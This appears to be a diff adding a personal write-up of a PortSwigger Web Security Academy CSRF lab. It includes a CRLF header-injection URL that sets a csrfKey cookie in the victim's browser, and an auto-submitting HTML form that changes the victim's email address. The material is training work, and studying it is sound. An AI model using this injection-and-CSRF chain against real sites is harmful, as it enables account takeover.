@@ -1,0 +1,24 @@
+CSRF where token is tied to non-session cookie
+https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie
+
+1. using valid cred from other users - posiible
+
+2. set-cookie
+
+/?search=blablabla%0d%0aset-cookie:%20csrfKey=d7M2CUuEz2imQhLwVICFeCAPz2tqPAZt
+
+\r\n ==> %0d%0a
+
+url to inject csrfKey cookie to victims browser:
+https://0a1d007403ac6fa2c0e613e900e40069.web-security-academy.net/?search=blablabla%0d%0aSet-Cookie:%20csrfKey=d7M2CUuEz2imQhLwVICFeCAPz2tqPAZt
+
+<html>
+    <body>
+        <form action="https://0a1d007403ac6fa2c0e613e900e40069.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="success@gmail.com" />
+            <input type="hidden" name="csrf" value="vT23gHJ7YPLRnh6BEtNClRvnJuRzJW2i" />
+        </form>
+        <img src="https://0a1d007403ac6fa2c0e613e900e40069.web-security-academy.net/?search=blablabla%0d%0aSet-Cookie:%20csrfKey=d7M2CUuEz2imQhLwVICFeCAPz2tqPAZt" onerror="document.forms[0].submit()"/>
+    </body>
+</html>
+
